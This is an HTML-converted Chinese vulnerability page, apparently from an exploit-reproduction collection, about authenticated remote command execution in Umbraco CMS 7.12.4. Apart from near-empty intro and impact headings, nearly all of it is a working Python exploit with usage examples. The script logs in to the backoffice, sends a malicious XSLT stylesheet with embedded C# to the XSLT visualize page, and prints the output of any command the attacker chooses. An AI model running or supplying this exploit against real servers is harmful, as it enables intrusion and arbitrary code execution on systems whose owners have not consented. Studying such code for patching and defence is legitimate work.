<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Umbraco CMS 7.12.4 后台远程命令执行漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>Umbraco CMS 7.12.4</p><h2>三、复现过程</h2><h3>Usage</h3><p>$ python exploit.py -h<br />usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]<br /><br />Umbraco authenticated RCE<br /><br />optional arguments:<br />  -h, --help                 show this help message and exit<br />  -u USER, --user USER       username / email<br />  -p PASS, --password PASS   password<br />  -i URL, --host URL         root URL<br />  -c CMD, --command CMD      command<br />  -a ARGS, --arguments ARGS  arguments</p><h3>Examples:</h3><p>$ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig<br />$ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls'</p><h3>poc</h3><p># Exploit Title: Umbraco CMS - Authenticated Remote Code Execution <br /># Date: 2020-03-28<br /># Exploit Author: Alexandre ZANNI (noraj)<br /># Based on: https://www.exploit-db.com/exploits/46153<br /># Vendor Homepage: http://www.umbraco.com/<br /># Software Link: https://our.umbraco.com/download/releases<br /># Version: 7.12.4<br /># Category: Webapps<br /># Tested on: Windows IIS<br /># Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig<br /><br />import requests<br />import re<br />import argparse<br /><br />from bs4 import BeautifulSoup<br /><br />parser = argparse.ArgumentParser(prog='exploit.py',<br />    description='Umbraco authenticated RCE',<br />    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))<br />parser.add_argument('-u', '--user', metavar='USER', type=str,<br />    required=True, dest='user', help='username / email')<br />parser.add_argument('-p', '--password', metavar='PASS', type=str,<br />    required=True, dest='password', help='password')<br />parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,<br />    dest='url', help='root URL')<br />parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,<br />    dest='command', help='command')<br />parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,<br />    dest='arguments', help='arguments', default='')<br />args = parser.parse_args()<br /><br /># Payload<br />payload = """\<br />&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  &lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;\<br />""" % (args.arguments, args.command)<br /><br />login = args.user<br />password = args.password<br />host = args.url<br /><br /># Process Login<br />url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"<br />loginfo = { "username": login, "password": password}<br />s = requests.session()<br />r2 = s.post(url_login,json=loginfo)<br /><br /># Go to vulnerable web page<br />url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"<br />r3 = s.get(url_xslt)<br /><br />soup = BeautifulSoup(r3.text, 'html.parser')<br />VIEWSTATE = soup.find(id=&quot;__VIEWSTATE&quot;)['value']<br />VIEWSTATEGENERATOR = soup.find(id=&quot;__VIEWSTATEGENERATOR&quot;)['value']<br />UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']<br />headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}<br />data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,<br />    "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,<br />    "ctl00$body$xsltSelection": payload,<br />    "ctl00$body$contentPicker$ContentIdValue": "",<br />    "ctl00$body$visualizeDo": "Visualize+XSLT" }<br /><br /># Launch the attack<br />r4 = s.post(url_xslt, data=data, headers=headers)<br /># Filter output<br />soup = BeautifulSoup(r4.text, 'html.parser')<br />CMDOUTPUT = soup.find(id="result").getText()<br />print(CMDOUTPUT)</p></body></html>